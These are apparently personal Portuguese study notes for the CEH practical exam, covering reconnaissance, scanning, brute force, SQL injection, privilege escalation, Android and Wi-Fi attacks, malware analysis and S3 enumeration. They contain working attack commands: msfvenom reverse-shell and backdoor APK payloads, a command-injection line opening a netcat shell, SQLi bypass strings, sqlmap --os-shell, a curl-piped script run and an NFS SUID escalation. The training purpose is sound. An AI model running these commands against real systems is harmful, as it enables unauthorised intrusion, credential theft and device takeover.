# CEH---NOTAS


## Tools Used

	Parrot/Kali : NETDISCOVER | NMAP | HYDRA | JOHN | WPSCAN | SQLMAP | ADB (ANDROID DEBUG BRIDGE)

	Windows : WIRESHARK | HASHCALC | VERACRYPT | BCTEXTENCODER | CRYPTOOL | SNOW | OPENSTEGO

Exploracao de usuarios no windows:

-Ferramenta de gerenciamento de usuarios
-net user no power shell ou cmd
-Ver detalhes no ADExplorer

## FOOTPRINT | RECONNAISSANCE


### Websiteinformer

https://website.informer.com/
### DNS 

		 nmap -p 53 --script dns-brute site.com

		fierce --domain site.com --subdomain-file /usr/share/wordlis.txt


### Ferramenta Gráfica DIRBUSTER

		dirbuster&
*Abre a ferramenta em modo gráfico, configurar e rodar, ela vai achar diretórios e arquivos e fazer a raiz das pastas*

### Ferramenta GOBUSTER

* Encontrando diretorios e arquivos
* sintaxe 
-> gobuster dir -u *url* -e -w *caminho da wordlist de força bruta*
*Também pode ser usado ao final -x passando as extenções do diretórios e arquivos que quer encontrar, exmp: .php,.txt,.sql,.bkp e etc*

No final voce pode colocar o -s e o codigo que você quer que ele traga, por exemplo -s 200 ele tras somente as paginas que retornam um codigo 200 e o -a para passar um user-agent personalizado, bom para burlar algum sistema de segurança
Recon Subdomains (DNS)
gobuster dns -d grupocerveja.com.br -w passwdlist -t 30
Faz o recon de dns, ou seja, faz o brute force com palavras que podem esta a frente do dns principal, exemplo rh.grupocerv.... 

### Ferramenta CADAVER

* sintaxe -> conexão no protocolo webdav para ganhar acesso ao servidor
-> cadaver *url*/webdav
*Quanto conectado você pode usar qualquer comando do terminal para operar o servidor

### Ferramenta FFUF

* sintaxe -> através do IP voce pode encontrar diretórios, usa qualquer wordlist -w. após a wordlist usando -e voce pode especificar o tipo de arquivo, ex: (.sh, .cgi, .pl, .py entre outros). O "/FUZZ é aonde ele vai incluir o diretorio que achar no recon"

-> ffuf -u http://10.10.10.56/FUZZ -w /usr/share/wordlists/....txt  -H "Host:FUZZ.site.com" -fs4605

### DIRB 

* Faz brute force em arquivos e diretorios de um site, e da para escolher as listas que ele tem de nomes, ex:

	dirb http://businesscorp.com.br /usr/share/dirb/wordlists/(ai tem a big.txt, small.txt    e etc..se nao colocar nada ele roda a comum), lista das funções abaixo 

-c: Set a cookie for the HTTP request. 
-f: Fine tunning of NOT_FOUND (404) detection. 
-H: Add a custom header to the HTTP request. 
-i: Use case-insensitive search. 
-l: Print “Location” header when found. 
-N: Ignore responses with this HTTP code. 
-o: Save output to disk. 
-p: Use this proxy. (Default port is 1080) 
-P: Proxy Authentication.
-r: Don’t search recursively.
-R: Interactive recursion. (Asks for each directory) 
-S: Silent Mode. Don’t show tested words. (For dumb terminals) -t: Don’t force an ending ‘/’ on URLs. 
-u: HTTP Authentication.
-v: Show also NOT_FOUND pages. 
-w: Don’t stop on WARNING messages. 
-X / -x: exmplo: dirb https//globo.com/ -X.php (para extensao php) 
-z: Add a milliseconds delay to not cause excessive Flood.
### Gobuster 

* Para achar diretórios 

		gobuster dir -u http://site.com -w /usr/share/wordlist/....txt
*se colocar no final -x txt,pdf e etc acha arquivos tbm..*

 Para achar vhosts

		gobuster vhost -u http://site.com -w /usr/share/wordlist/....txt --append-domain
### Search engines
*VIDEO SEARCH
https://mattw.io/youtube-metadata/

*FTP SEARCH*

https://www.searchftps.net
https://www.globalfilesearch.com
http://www.freewareweb.com

*IOT SEARCH*

www.shodan.io

*DOMAIN AND SUBDOMAIN ENTERPRISES* 

www.netcraft.com
https://searchdns.netcraft.com/?host=*.globo.com (trocar o globo.com por qualquer outro dominio)

*PEOPLE SEARCH*

https://www.peekyou.com/

*DNS RECORDS COM NSLOOKUP*

		nslookup
		set type=a
		www.site.com

sites:
www.kloth.net/services/nslookup.php
www.dnsdumpster.com
www.network-tools.com

*DNS REVERSO*

www.yougetsignal.com
opção reverse ip domain check


*ENCONTRANDO OS COM CENSYS*

www.search.censys.io

### Domainfy

encontra dominios com o nome que voce passar

		domainfy -n eccouncil -t all

similares

usufy - acha usuarios com o nome passado
mailfy - acha conta de emails
phonefy
entify - acha expressoes regulares de url


### Billcipher

		python3 billcipher.py
*tambem de recon*

### EmailTrackerpro

Programa para rastrear emails copiando o hearder e colando no programa
### Winhttrack website copier

Programa que pode ser baixado que serve para copiar sites inteiros!

### TheHarvester

Esse programa que esta no kali e parrot OS pega dominios, sub dominios, emails e muito mais

Sintaxe:
  
Para usar a ferramenta Harvester de root, era necessário copiá-la para o diretório usando o comando 

		cp -vr theHarvester/*

		 theharvester -d microsoft.com -l 200 -b google
*-d especifica a companhia
-l o numero de resultados
-b tipo de busca*

Outros exemplos

		 theharvester -d eccouncil -l 200 -b linkedin

### Sherlock

use o sherlock para buscar informações de vitimas

em home/attacker/sherlock/sherlock

		 python3 sherlock.py vitima1

outros..

www.social-searcher.com
www.followerwonk.com/analyze
ou UserRecon no github

### Descobrindo informações do alvo com o Ping

Quebra de pacotes:

ping www.site.com -f -l 1500 (ir variando ate encontrar o tamanho de bytes ideal)


### Photon para fazer recon site

		python3 photon.py -u http://www.site.com
*ele criara uma pasta com o retorno, o photon geralmente fica em homt/attacker/photon*

### Capturar wordlists em sites

		 cewl -w wordlist.txt -d 2 -m 5 www.site.com
*-w ja grava as palavras no arquivo
-d representa a profuncidade
-m o minimo de letras da palavra*
## Ports

### Porta 17

	–>QOTD – TCP/UDP – O Serviço de Mensagem do dia (Quote Of The Day) é alvo de Trojans.

### Porta 19

	–> Chargen – TCP/UDP – Chargen é um protocolo de comunicação muito vulnerável, que é usado para amplificar os ataques DdoS, que é um ataque distribuído de negação de serviço.

### Porta 21

	–> FTP – TCP – É utilizado  o FTP que permite que computadores dentro de uma rede promovam trocas de arquivos em massa

### Porta 22

	–> SSH – TCP/UDP – É uma porta padrão para acesso remoto (normalmente baseados em sistemas LINUX).
	-> Para acesso as configurações ssh do servidor -> /etc/ssh/sshd_config
	-> Dentro das configurações pode ser alterado o numero da porta, tipos de conexão e etc, é uma boa prática de segurança que o usuário root esteja desabilitado a se autenticar via ssh.
	-> Um scan de portas com nmap normalmente acha o serviço ssh, mas atanção a alteração de numero de portas que é possível dentro das configurações, geralmente tambem é usada a porta 2222.
	 -> Dentro do diretorio root existe uma pasta oculta .ssh, onde ficam alguns arquivos, dentre eles o authorized_keys onde ficam as chaves autorizadas para conexão direta e o arquivo know_hosts onde ficam os fingerprints dos hosts que já tentaram conexão com esse servidor

### Porta 23

	–> Telnet – TCP/UDP – Telnet é um protocolo de comunicação que permite a execução remota de códigos maliciosos.

### Porta 67 | 68

	–> DHCP Server e Client – Pelo serviço DHCP é possível fazer uma configuração automática e dinâmica de computadores que estejam ligados a uma rede TCP/IP.

### Porta 111

	–> Portmap – TCP/UDP – O serviço portmap é um daemon (programa executado em background) para serviços RPC, como o NIS e o NFS, que pode autorizar a execução de códigos maliciosos.

### Porta 123

	–> NTP – UDP – O NTP é um protocolo para sincronizar relógios de computadores e equipamentos de rede, e pode ser vulnerável a servidores de NTP não confiáveis.

### Portas 135 | 136 | 137 | 138 | 139 

	–> Microsoft NetBios – TCP UDP – Estas portas são utilizadas no SO Windows para compartilhamento de arquivos e impressoras.
		para achar informacao do alvo
		no windows cmd: nbtstat -a ip_do_alvo

### Portas 161 | 162

	–> SNMP – TCP/UDP – As portas acima estão associadas com o protocolo de monitoramento SNMP, que devido a diversas vulnerabilidades, devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 1433

	–> ms-sql – TCP/UDP – Porta padrão de acesso ao SQL Server.

### Porta 1900 

	–> SSDP – UDP – O SSDP é um protocolo de descoberta de serviço com diversas vulnerabilidades. devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 3306 

	–> MYSQL – TCP/UDP – Porta padrão de acesso ao Mysql Server

### Porta 3389

	–> RDP – TCP/UDP – O RDP é um protocolo multi-canal que permite a conexão entre computadores remotamente, e que pode ser usado de maneira maliciosa. Quando aberta e se voce tem uma credencial pode usar o RDESKTOP do kali para acessar a maquina remotamente

### Porta 5353

	–> mDNS – UDP – O mDNS é um protocolo multi-canal que resolve a resolução de nomes de computadores em pequenas redes e possui enormes vulnerabilidades.

### Porta 5900

	–> VCN – TCP/UDP – O serviço VNC (Virtual Network Computing) pode permitir acesso indesejado ao computador que têm esse serviço habilitado,  podendo ser usado para ataques ou roubo de informações,

### Porta 8012

	–> Telnet – podemos nos conectar via telnet nessa porta e tentar uma invasao
	Ao achar essa porta aberta podemos criar um payload e jogar dentro da maquina para conseguir uma shell
		msfvenom -p cmd/unix/reverse_netcat LHOST=myip LPORT=444
	copio o payload todo mkfifo /tmp/..../tmp/msnht..
	abro um nc -lnvp 444
	vou ate o telnet aberto na porta 8012 e dou um run
		RUN mkfifo /tmp/..../tmp/msnht..
	ele abrira uma shell

### Porta 10000

	–> TCP – Porta padrão de acesso ao Miniserv / Webmin httpd. 

## Broteforce

hydra -L <caminho_para_lista_de_usuarios> -P <caminho_para_lista_de_senhas> ipAlvo Protocolo

Para pegar qualquer arquivo e baixar usar o parametro get

## Enumeration | Scanning | Nmap

### Enum4linux

		 enum4linux -a op
### Unicornscan

		unicornscan ip -Iv
*descobre portas abertas e o SO*

### Angryip

www.andryip.org
*se puder fazer o download e uma excelente ferramenta para achar hosts e portas*
### Netdiscover

		netdiscover -i eth0
### NMAP

### Enganando IDS/firewall

		 nmap -f ip -> fragmenta os pacotes em pacotes menores para bypassar o ids
		nmap -g 80 ip -> troca a porta do scanner pois alguns ids liberam certas portas para conexao como HTTP, DNS, FTP e etc.
		nmap -mtu 8 ip -> manda o maximo de 8 bytes em cada pacote
		nmap -D RND:10 ip -> criar um chamariz (decoy) com 10 ips diferentes jogados para o alvo criando uma dificuldade do ids identificar quem esta escaneando a rede
		nmap -sT -Pn --spoof-mac 0 IP -> --spoof-mac é para randomizar o mac address

* Processo de mapeamento de rede

*Importante sempre usar o -Pn para encontrar os hosts ativos.
TCP HOST SCAN -sS
UDP HOST SCAN -sUV (colocar o V para caso a porta esteja com Reject no firewall ela vai bypassar)
NETWORK SWEEPING -> Examinar a rede e trazer hosts ativos em um arquivo ativos.txt, exp:
SERVICES SCAN -sV -> Captura serviços ativos nas portas, versões
OS SCAN -O | -A -> Captura o sistema operacional*

*sistema operacional simples*

		nmap -sS -O ip

		nmap --script smb-os-discovery.nse 10.10.1.1
*para descobrir o SO do computador com protocolos smb*

		nmap -sn -PR ip
*saber se o host esta ativo, -PU udp scan, -PE icmp scan, -sn bloqueia o scan de portas*

		nmap -v -sn 10.0.0.0/24 -oG ativos.txt
*Depois é só filtrar a lista com o grep para pegar somente os que estão ativos..e jogar em um arquivo hosts, ai com essa lista de hosts é só passar o nmap ou na lista (-iL) ou individual*

		 grep "Up" ativos.txt | cut -d " " -f 2 > hosts

*Para escanear um range especifico da rede por exemplo da subnet 1 a 20*

		nmap 10.0.0.1-20

*Para detectar firewalls bloquando a rede podemos usar a opção 
-sA  que usa o scan ACK para receber a informação*

		nmap -sA 10.0.0.15

*Para sabe o nome do host usamos a opção -sL*

		nmap -sL 10.0.0.15

*Para escanear arquivos com hosts -iL*

		nmap -iL hosts.txt*


Desafios:

* Tempo de scan e consumo de rede
* Firewall filtrndo / rejeitando pacotes
* Bloqueio de portscan
* IDS / IPS

### Andry ip scanner

no windows existe essa ferramente, pode ser baixada, para scanear ips

### SXscan

		sx arp 10.10.10.0/24 --json | tee arp.cache
		cat arp.cache | sx tcp -p 1-65535 10.10.10.11

### ZEnmap

Nmap do windows, pode ser usado de forma interativa

### SMB Enum

		sudo nmap -A -p 445 ip
		sudo nmap --script smb-os-discovery.nse ip
		sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse ip

  ** para quebrar senhas smb.NTLM.txt usar JOHN

## Network Enumeration

### TTL

linux 64
freeBSD 64
openBSD 255
Windows 128
cisco router 255
solaris 255
AIX 255

### IP Range

www.arin.net

coloque o IP e clique em search

Para traçar a rota de um site

windows - tracert site.com
linux - traceroute site.com

sites:
www.solarwinds.com
www.visualroute.com






## System Hacking

### SMB

*enumerar as portas 136,7,8,9*

		smbclient //ip/profiles
*para conectar*

*Se conseguir entrar pelo smb olhar em .ssh se as chaves estao la, copiar a chave id_rsa e tentar conexao com a porta ssh se estiver aberta 
	ssh -i id_rsa user@ip

### FTP

Porta 21 ABERTA

		ftp ip

		hydra -l usuario -P /usr/share/worlist...txt 000.000.00.0 ftp -v
## Metasploit

		service postgresql start
		msfdb init
		msfconsole

Escaneando a subnet dentro do metasploit

		nmap -Pn -sS -A -oX test 000.000.1.0/24

		db_import test
*ira importar o resultado para o banco de dados*

		search portscan
*os modulos de port scanning vao aparecer*
## Packet Sniffing - WIRESHARK

Abrir o arquivo .pcap

Comandos para colar na pesquisa:

Para DOS ataque  ir na barra de ferramentas em cima no wireshark em  statistics -> ipv4 statistics -> source and destination addresses. No campo display filter colar:

		tcp.flags.syn == 1 and tcp.flags.ack == 0    
*o ip do atacante o source ipv4 addresses que tiver mais contagem de pacotes, varias maquinas com altas contagens sao os ips dos atacantes*

Outro metodos -> statistics -> conversations

tcp.flags.syn == 1   (Which machine for dos)

Questão sobre achar credenciais, pass e senha:

*http.request.method == POST   (for passwords) or click tools ---> credentials
Also - Abrir no follow  - tcp stream para ver melhor*

Para vbuscar por senhas, credenciais, usar

http.request.method==POST

## Web Applications Haking

Criar shells

www.revshells.com

MSFVENOM

		msfvenom -l payloads | grep php (ou a extensao que quiser)
		msfvenom -p payloas LHOST seuIP LPORT suaPORTA -f raw > exploit.php

Command Injection

*Se em um campo voce colocar um valor e ele te retornar comandos do sistema, exem: Um campo para voce entrar com o IP e clicar no botao, e ao clicar ele msotra na tela um retorno de ping por exemplo, ai voce pode abrir um nc -vnlp 444 e passar nesse campo o iP && nc -c sh ip 444, e ganhar uma shell. Tambem pode tentar IP | ls ou IP |ls para ver se aparece direto na tela


Para Enumeração de paginas web podemos usar o wpscan, e com isso achar versões da pagina e meios de entrada e bypass, e ainda achar usuario e fazer brute-force com listas de senhas..

		wpscan --url http://site.com/ --enumerate t,p,u

		wpscan --url http://10.10.10.10:8080/ -e u
*acima, estamos enumerando o host e forçando para achar usuários, o wpscan tambem serve para fazeer aaque de força bruta *

		wpscan --url http://10.10.10.10:8080/ -u root -P pass.txt
*acima estamos realizando um ataque de força brutano usuario que encontramos com o scan anterior e a lista de senhas no arquivo pass.txt. Tambem podemos usar --passwords, --usernames e suas respectivas listas*

		use auxilliary/scanner/http/wordpress_login_enum
*se a pagina for wordpress podemos usar o metasploit framework para enumerar usuario e fazer força bruta*

[[Hydra]] para achar usuarios e senhas para autenticação em serviços ssh, ftp e etc..

Usar o [[Hydra]] para fazer autenticação forçada em todos os hosts com a porta aberta e jogar um usuario(-l) e senha(-p) padrão para iniciar já tentando encontrar vulnerabilidades de um modo mais rapido

		hydra -v -l root -p root IP ftp

opções..
-s = porta
-t = velocidade de execusao de tarefas (default 16)
-W = timeout (deixa mais lento mas é bom pra tapiar o host)
-v = verbose
-l = usuario
-L = lista de usuarios
-p = senha
-P = lista de senhas

*Se no scan voce achar uma porta 21 aberta ou escanear nmap -p 21 para acha-la voce consegue rodar o hydra com o ftp e as listas de usuario e senha dados na prova como no exemplo abaixo..*

	hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

*Achado o usuario e senha se conectar no ftp e baixar o arquivo secret.txt*

		ftp 10.0.0.1
		user xxx
		senha xxx

		ftp> get secret.
## SQL Injection

Um exemplo de ataque *Sqlinjection* seria por exemplo a manipulação desse codigo dentro da entrada de dados do usuário, caso o sistema não tenha no seu código uma forma de inspecionar essa entrada e uma limitação nesse campo.
Exemplo de uma entrada maliciosa no campo usuario:
* select \* from usuarios where login=' *admin ' or 1=1;#*' and senha=' senha ';
*Acima ele está injetando a parte em amarelo ao campo de login, porém como pode ser visto é passado após a entrada do login um "or" afim de enganar o servidor de bd dizendo que ou o login ou o 1=1 precisam ser verdadeiros para que a solicitacao seja aceita, e no final ele coloca um ";" para encerrar a requisição e um # para sinalizar que o restante do código não precisa ser interpretado*

* Ferramenta SQLMAP

 Automatiza os testes de SqlInjection

Pode se usar o sqlmap direto com a requisicao usando o burpsuite, quando for clicar no botao do formulario comprometido interceptar e copicar toda a request e colcar em um arquivo e fazer como abaixo:

		sqlmap -r req.txt --dbs
*e como se a req.txt fosse a url, usa da mesma forma*

		sqlmap -r req.txt -D nomeDoBanco --tables
*e etc..*


	 sqlmap -u "host exmp: 172.15.5.6/pasta/naose.php?loja.sp" (aqui voce pede --current-user --passwords --users, --columns, e etc.)
 
	sqlmap -u "host exmp: 172.15.5.6/pasta/naose.php?loja.sp" -D nomedobando -T tabela -C coluna --dump-all



1- Auth Bypass-  hi'OR 1=1 --

2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--

3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs

4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables

5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)

6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

## Password Cracking

## Cryptography

Encryptar e decryptar arquivos de texto

www.cryptoforce.com

www.aeppro.com

BCTextEncoder

www.jetico.com -> free security tools -> encrypt-text-bctextencoder

Para transformar palavras em hashes usamos:

		echo -n "palavra" | md5sum
		echo -n "palavra" | sha256sum
*etc..*

Para quebra-los:
www.hashes.com
www.crackstation.net

Ferramentas baixar

www.slavasoft.com (hashcalc)
www.md5calculator.com

Para arquivos com a extensao .hex, com isso usar a ferramenta cryptool. Um desses arquivos podem conter a senha para acesso ao ftp, ai assim que conseguir a senha decryptando o arquivo, pode ser que no nome do arquivo contenha o tipo de criptografia.
PAra fazer o acesso ftp:

		ftp ip 21
		user xxx
		pass xxx

## Steganography

Geralmente no windows tera um arquivo secret.txt que nao terá nada visivel dentro dele, porem havera uma pergunta sobre esse arquivo e o que esta contido nele, nesse momento devera ser usada a ferramenta snow. A senha é passada na questao.

		snow -C -p "senha" secret.txt
*ficar atento se tem o snow na maquina senao baixar em darkside.com.au/snow e atentar ao nome do arquivo se tiver em caixa alta SNOW passar para snow.*

Tambem tem a opção de usar o openstego, um software que é só jogar o documento ou a imagem lá e decriptar  a mensagem escondida

Site para steganofrafia 

https://stegonline.georgeom.net/upload

## Privilege Escalation

Va em git hub linPEAS
ou
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 - O linPEAS vai buscar dentro do sistemas cves ou formas de escalar privilegios, ai é so pegar algum nos repositorios que ele indica, exem:
		

*Usando api Polkit or Policykit (Linpeas)*
Explorando a cve 2021-4034
google: github berdav cve-2021-4034
Passos:
 - git clone
 - entrar na pasta
 - digitar make
 - ./cve-2021-4034
 - whoami
 - sudo -l (para confirmar o privilegio)

---*---------*------
NFS escalation

Maquina da vitima 
 - sudo apt-get update
 - sudo apt install nfs-kernel-server
 - nano /etc/exports 
 - Adicionar no final do arquivo: /home    \*(rw,no_root_squash)
 - sudo /etc/init.d/nsf-kernel-server restart
 - sudo nmap -sV ip, conferir se a porta 2049 esta aberta
 - sudo apt-get install nfs-common
 - showmount -e ip (se ver /home \* no final)
 - mkdir /tmp/nfs
 - sudo mount -t nfs ip:/home /tmp/nfs
 - cd /tmp/nfs
 - sudo cp /bin/bash . (copiando o bin bash)
 - sudo chmod +s bash
 - ls -la (conferir se o bash esta marcado)
 - ssh user@ipAlvo
 - cd /home
 - ./bash -p
 - whoami (expect root)




Se for passado um range de hosts para analisar e usar uma senha e usuario de outra pessoa para escalar privilegio, procurar pela porta 22 do ssh para entrar mais facilmente, exemplo

range 10.10.1.0/24
nmap -sV -p 22 10.10.1.0/24

		ssh usuario@ip
		password...

		sudo -i
*para ser root, checar com whoami*

va para o diretorio root 

		cd /
		find . -name arquivoQueQuerAchar
*encontrando o caminho do arquivo dê um cat nele.*

## Mobile Hacking

*Hacking mobile com msfvenom



Primeiro, conceito de entropia: entropia seguinifica a medicao da aleatoriedade ou imprevisibilidade de varios elementos como criptografia de senhas, chaves e dados. Uma senha facil tem baixa entropia enquanto uma senha complexa tem uma entropia alta. No programa de analise de malware DIE pode-se ter tambem essa informacao de entropia

Para encontrar o host ativo usando android emulator procuramos pela porta 5555 aberta

		nmap -Pn 00.0.0.000

	   Port     STATE SERVICE
	   5555/tcp open  freeciv

No prompt do sistema usar o:

		abd connect 0.0.0.0:5555
*esse comando conecta o abd com o os*

		abd shell
*depois de conectado esse comando lança a shell para dentro do sistema do android e abre a o prompt do android ai é só das um ls, abrir as pastas e procurar o arquivo secret, geralmente dentro de sdcard ou downloads*
resumo
	adb connect ip:porta
	adb devices -l
	adb shell

Dentro do cmd do dispositivo movel procurar na pasta sdcard / scan os arquivos, senao secret.txt, os arquivos .elf.

encontrando a pasta, dentro dela das um pwd para pegar o caminho e em seguida sair da exploracao e virar root para baixar os arquivos no mobile

		 sudo -i
		 adb pull /sdcard/scan
*Com isso vira root e baixa os arquivos dentro da pasta*
*Se nao for root da para usar adb pull /sdcard/scan parrot/ , que ele tambem baixa, usei parrot mas é o nome que fica no cmd no meu caso parrot@parrot]-[~]..  e etc..*

Tendo o arquivo .elf na maquina voce precisa da ferramenta ent, se nao tiver baixe com apt install ent. 
Talvez se tiver mais de um arquivo, deve pegar o de maior entropia, ou seja o mais complexo, depois pegar ele e encryptar no hash pedido ai pode usar o shaxxxsum arquivo.elf e fazer o que se pede

### Criando APK malicioso para ouvir no mtasploit

*Para achar os payloads para usar no msfvenom* msfvenom -l payloads | grep android

		msfvenom -p android/meterpreter/reverse_tcp LHOST=seuIP LPORT=4444 -f raw > file.apk

ou

		msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=seuIP LPORT=4444 -f raw -o Backdoor.apk

Na mesma pasta da criacao do apk abrir servidor http

		python3 -m http.server
		msfconsole
		use multi/handler set payload android/meterpreter/recerve_tcp

### PhoneSploit

git clone https://github.com/prbhtkumr/PhoneSploit.git

Na maquina da vitima ir em developer tools, usb debugging put on. Ir em configuracoes avancadas no wifi e pegar o ip

De um nmap -sS -p- -Pn IP (ou -p 5555 pois é a que procuramos)

precisamos ter phonesploit
adb e a biblioteca do python colorama

		sudo apt install adb
		python3 -m pip install colorama

depois é so executar o phonesploit, colocar  o ip da vitima e colocar opcao 4 para ter a shell
Opcao 9 para fazer downloads, exemp

		9
		/sdcard/Download/images.jpeg

### Android Analyzer

Para analisar apk malicioso

sixo online apk analyzer



## Wifi Hacking

Monitoramento

Verificar a rede com iwconfig

Rodar

		sudo airmon-ng start wlan0
*wlan0 ou o que achar dando o comando iwconfig, se tiver comandos rodando de um sudo kill -9 id e conferir a rede novamente com iwconfig*

		sudo airodump-ng wlan0

### Cracking Wifi Password:

Primeiro abra o arquivo do wireshark o .pcap com o aircrack e vamos achar o WAP

		 aircrack-ng 'pcap.file'
*da para arrastar o arquivo para dentro do prompt do parrot. O retorno sera o aircrack-ng identificando o bssid o eddid e a encryptio se é WAP e etc..Somente esse comando ja quebraria se fosse WEP, mas se for WPA usar os modos abaixo.*

		 aircrack-ng -w 'wordlist' 'pcap file' 

Ou abrir o arquivo .pcap no wireshark e copiar o BSSID clicando nele indo em copy e value
![[copyBssid.jpg]]

então faça

		 aircrack-ng -b 6c:5b:3w:8a:6e:8d -w 'wordlist' 'pcap file' 

### Ferramenta hcxdumptool

		sudo apt-get install hcxdumptool
*checar o adaptador de rede com iwconfig*

		sudo systemctl stop NetworkManager
		sudo systemctl stop wpa_supplicant
		sudo hcxdumptool -i wlan0 --do_rcascan
*esse ultimo escaneia a rede atras do alvo*

		sudo hcxdumptool -i wlan0 0o arquivo.pcapng -active_beacon -enable_status=15
*esse comando cria o arquivo com o alvo*

### Converter arquivos pcap para usar no hashcat

		sudo apt-get install hcxtools

		hcxpcapngtool -o hash.hc22000 -E essidlist arquivo.pcapng
*acima estamos usando a ferramenta para converter o arquivo pcapng em .hc22000, agora precisamos do macadress da vitimas para ver qual é qual, dai abrir o arquivo hash.hc22000 com nano e deixar somente a linha daquele mac especifico, apagar as outras*

		sudo hcxdumptool -i wlan0 --do_rcascan

Agora pegar o arquivo  pcap e jogar no site hashcat.net/cap2hccapx para converter em .hc22000 para hashcat

### Usando hashcat no windows

Fazer download da ferramenta, jogar o arquivo convertido em .hc22000 para a pasta do hashcat
no prompt:

		.\hashcat.exe -m 22000 -a 0 -d 3 -o cracked.txt hash.hc22000 rockyou.txt

## IoT Hacking

MQTT - protocolo de transporte mensagem telemetria
Publish - send a topic with payload to mqtt broker
Subscribe - request a topic with payload update from mqtt

Analizando a rede:

Pode ser visualizado no Wireshark, utilizando "mqtt" como filtro:

Após uma conexão segura ter sido estabelecida com o Broker MQTT, o Cliente MQTT pode publicar mensagens.

Os cabeçalhos no pacote da Mensagem de Publicação são:
- Flags do Cabeçalho: Contêm informações sobre o tipo de pacote de controle MQTT.
- Flag DUP: Se for 0, indica que é a primeira tentativa de enviar o pacote PUBLISH; se for 1, indica uma possível tentativa de reenvio da mensagem.
- QoS: Determina o nível de segurança da mensagem.
- Flag Retain: Se for 1, o servidor deve "manter" ou armazenar a mensagem e sua QoS, para que possa atender a futuras inscrições que coincidam com o tópico.
- Nome do Tópico: Contém uma string UTF-8 que pode incluir barras diagonais, necessitando de estrutura hierárquica.
- Mensagem: Contém os dados atuais a serem transmitidos.
- Carga (Payload): Contém a mensagem que está sendo publicada.

Um Pacote de Liberação de Publicação (PUBREL) é uma resposta a um Pacote de Recebimento de Publicação (PUBREC). Um Pacote de Conclusão de Publicação (PUBCOMP) é uma resposta a um Pacote de Liberação de Publicação.
## Malware analysis

Malware - nada mais é do que um executável (um codigo binário) que por sua natureza é feito para fins maliciosos. É usado  por atacantes (crackers) para fins maliciosos como espionagem, captura de videos, captura de comando, teclados, extração/captura ou destruição de dados. Um dos exemplos mais falados hoje são os ransomwares, onde o malware captura, encrypta e destroi dados

Existem algumas ferramentas para scanear e analisar malwares como:

Valkyrie - www.valkyrie.comodo.com
Cuckoo Sandbox - www.cuckoosandbox.org
Jotti - www.virusscan.jotti.org
Iobit Cloud - www.cloud.iobit.com
Hybrid - www.hybrid-analysis.com

Bintext -> extrai texto de qualquer arquivo

Obfuscation -> vírus executável dentro de um programa comum, jogar arquivo no programa PEid

DIE -> abre programas com extensao .elf, analisa todo o arquivo, entropia, tamanho, hashs e etc..

PE explorer tool -> serve para ver e editar varios arquivos executaveis do wind. exe, dll, activex e outros
*outros:*
www.aldeid.com
www.angusj.com

Dependency walker Tool -> identificar o arquivo da dependencia como arquivo executavel, serve para ver todos os modulos do arquivo
*outros:*
www.jeremylong.github.io
www.snyk.io
www.retirejs.io

IDA -> disassembler

OllyDbg -> disassembler, debbuger. Viem -> logs, e view -> executable modules para ver logs e modulos executaveis

Ghidra -> soft eng. reversa, disassembler
### Questions?

	How many machines are active?
	Use netdiscover

	Which machine has ftp server open?
	Use nmap to do a scan

	Find 2 secret files using FTP?
	Do brute force FTP username

	Find out phone number of web app user?
	Use sqlmap for show database

	Brute force WP website user´s password
	Use wpscan

	Decode .hex file?
	Use cryptool

	Which machine started DOS attack? DDOS attack happened on which IP? Find out http          credentials from PCAP file?
	Use wireshark to check PCAP file

	Decode the given text using given secret
	Use BCTextEncoder

	Calculate SHA1 hash of a text?
	Use hashcalc

	Decrypt the hidden volume and find secret file
	Use veracrypt, pegar arquivo dado e fazer um mount dentro do programa e usar a senha dada
 	abrir o drive que voce escolheu d: c: k: e etc..e pegar o arquivo que esta dentro dele.

	Crack the givem hash
	Use hashes.com to crack wasy the hash

	Find secret hidden in the image/file?
	Use openstego for images or Snow to a file

	Find a secret file in android?
	Use ADB - Android debug bridge

	Send data to another machine (firewall blocked)
	Use covert t




## Cloud

Enumeracao de containers S3 buckets

Ferramenta lazys3

		git clone https://github.com/nahamsec/lazys3
		 ruby lazys3.rb nome_da_empresa
*Para abrir no browser se aparecer um 200ok, nome_da_empresa.s3.amazonaws.com*

Ferramenta cloud_enum

		sudo apt install cloud-enum
		cloud_enum -k nome_da_empresa --disable-azure --disable-gcp

Ferramenta S3Scanner

		 cd /home/kari/S3Scanner
		 python3 ./s3scanner.py (arquivo com um formato http:// ou https:// por linha)
		 python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt (dump all open bucket and log both open and closed buckets in found.txt)
		python3 ./s3scanner.py --names.txt (just log open buckets in the default output file)
		python3 ./s3scanner.py --list names.txt (save the file listings of all open buckets to a file)

Explorando S3

Usando aws cli

		sudo apt-get install awscli
		cloud_enum
		cloud_enum -k site.com --disable-azure --disable-gcp
*depois de achar os arquivos dar um ls.. *

		aws s3 ls s3://site.com/ --no-sign-request
*esse comando lista os arquivos, ai e so baixar*

		aws s3 cp s3://site.com/arquivo.txt . --no-sign-request

Autenticacao e escalacao privilegio no buncker s3

* Abrir conta aws, ir em IAM, criar usuario, selecionar opcao de credencial access key
* Criar usuario e copiar para o notepad key e accesskey
* Ir no prompt colocar aws configure --profile nome_user
* Entrar com dados pedidos de keys e etc.
